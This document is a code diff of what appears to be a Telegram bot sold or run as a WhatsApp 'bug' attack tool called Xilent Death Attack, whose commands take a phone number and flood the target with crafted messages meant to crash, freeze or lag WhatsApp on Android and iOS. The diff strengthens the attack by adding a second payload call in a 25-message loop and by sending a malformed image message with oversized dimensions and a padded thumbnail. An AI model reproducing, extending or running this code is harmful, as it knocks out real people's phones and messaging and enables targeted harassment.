@@ -1663,13 +1663,13 @@ bot.action('/bug', async (ctx) => {
     const bugMenu = `<blockquote><b>「 ＢＵＧ ＭＥＮＵ 」</b></blockquote>
 <blockquote expandable><b>━═「 ＸＩＬＥＮＴ ＡＮＤＲＯＩＤ 」═━</b>
 ❀ ! /xforce 62xx
-   ╰┈➤ Forclose Andro
+   ╰┈➤ Crash Andro
 ❀ ! /xloli 62xx 
-   ╰┈➤ Freeze X Blank Invis
+   ╰┈➤ Lag Invis
 ❀ ! /xdelay 62xx
    ╰┈➤ Delay Andro
 ❀ ! /xfuck 62xx
-   ╰┈➤ Blank No Click
+   ╰┈➤ Crash No Click 
 ╰─────────────────────⬣</blockquote>
 <blockquote><b># - Xilent Death Attack</b></blockquote>`;
 
@@ -1716,7 +1716,7 @@ bot.action('/bug2', async (ctx) => {
 ❀ ! /xcrash 62xx
    ╰┈➤ Crash WhatsApp
 ❀ ! /savage 62xx
-   ╰┈➤ Force Invis
+   ╰┈➤ Crash X Delay
 ╰─────────────────────⬣</blockquote>
 <blockquote><b># - Xilent Death Attack</b></blockquote>`;
 
@@ -1728,7 +1728,7 @@ bot.action('/bug2', async (ctx) => {
                 style: "Danger"
             },
             {
-                text: "⌜🔙⌟ Back Aja Njierr", callback_data: "/bug", style: "Success"
+                text: "⌜🔙⌟ Back Aja Njierr", callback_data: "/bug", style: "Danger"
             }
         ]
     ];
@@ -4056,14 +4056,14 @@ bot.hears(/^(\/)?(xforce|xcrash|xios)(\s|$)/i, checkWhatsAppConnection, checkPre
 <blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
 𖤓 Target:  ${q}
 𖤓 Type: Hard
-𖤓 Android: Forclose/Delay
+𖤓 Android: Crash/Delay
 𖤓 Ios: Blank Click/No Click
 𖤓 Status: Process
 <blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}`, style : "Succes" }
       ]]
     }
   });
@@ -4072,6 +4072,7 @@ bot.hears(/^(\/)?(xforce|xcrash|xios)(\s|$)/i, checkWhatsAppConnection, checkPre
 
   for (let i = 0; i < 25; i++) {
     await AmbaFcNewVIP(sock, target);
+    await blankbyambajahat(sock, target);
     await new Promise((r) => setTimeout(r, 1000));
   }
 
@@ -4079,14 +4080,14 @@ bot.hears(/^(\/)?(xforce|xcrash|xios)(\s|$)/i, checkWhatsAppConnection, checkPre
 <blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
 𖤓 Target:  ${q}
 𖤓 Type: Hard
-𖤓 Android: Forclose/Delay
+𖤓 Android: Crash/Delay
 𖤓 Ios: Blank Click/No Click
 𖤓 Status: Success
 <blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`, {
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}`, style : "Succes" }
       ]]
     }
   });
@@ -4104,14 +4105,14 @@ bot.hears(/^(\/)?(flowx|xdelay|xbuldo)(\s|$)/i, checkWhatsAppConnection, checkPr
 <blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
 𖤓 Target:  ${q}
 𖤓 Type: Hard
-𖤓 Android: Delay Hard
+𖤓 Android: Delay Hard / Crash
 𖤓 Ios: Delay Super Hard
 𖤓 Status: Process
 <blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}`, style : "Succes" }
       ]]
     }
   });
@@ -4127,14 +4128,14 @@ bot.hears(/^(\/)?(flowx|xdelay|xbuldo)(\s|$)/i, checkWhatsAppConnection, checkPr
 <blockquote><b>𖤓〘 𝐗𝐢𝐥𝐞𝐧𝐭 𝐃𝐞𝐚𝐭𝐡 𝐀𝐭𝐭𝐚𝐜𝐤 〙𖤓</b></blockquote>
 𖤓 Target:  ${q}
 𖤓 Type: Hard
-𖤓 Android: Delay Hard
+𖤓 Android: Delay Hard / Crash
 𖤓 Ios: Delay Super Hard
 𖤓 Status: Success
 <blockquote><b>𖤓〘 𝐗𝐈𝐋𝐄𝐍𝐓 𝐃𝐄𝐀𝐓𝐇 〙𖤓</b></blockquote>`, {
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}`, style : "Succes" }
       ]]
     }
   });
@@ -4159,7 +4160,7 @@ bot.hears(/^(\/)?(xloli|savage)(\s|$)/i, checkWhatsAppConnection, checkPremium, 
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}`, style : "Succes" }
       ]]
     }
   });
@@ -4182,7 +4183,7 @@ bot.hears(/^(\/)?(xloli|savage)(\s|$)/i, checkWhatsAppConnection, checkPremium, 
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [[
-        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}` }
+        { text: "⌜📱⌟ CHECK TARGET", url: `https://wa.me/${q}`, style : "Succes" }
       ]]
     }
   });
@@ -4227,10 +4228,13 @@ async function AmbaFcNewVIP(sock, target) {
           fileSha256: Buffer.from("SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=", "base64"),
           fileEncSha256: Buffer.from("l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=", "base64"),
           mediaKey: Buffer.from("UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=", "base64"),
-          mimetype: "image/webp",
+          mimetype: "image/jpeg",
           directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g",
           fileLength: "99999999",
-          mediaKeyTimestamp: "1775044724"
+          height: 2000,
+          width: 2000,
+          mediaKeyTimestamp: "1775044724",
+          jpegThumbnail: Buffer.alloc(45000, 0)
         }
       }
     }
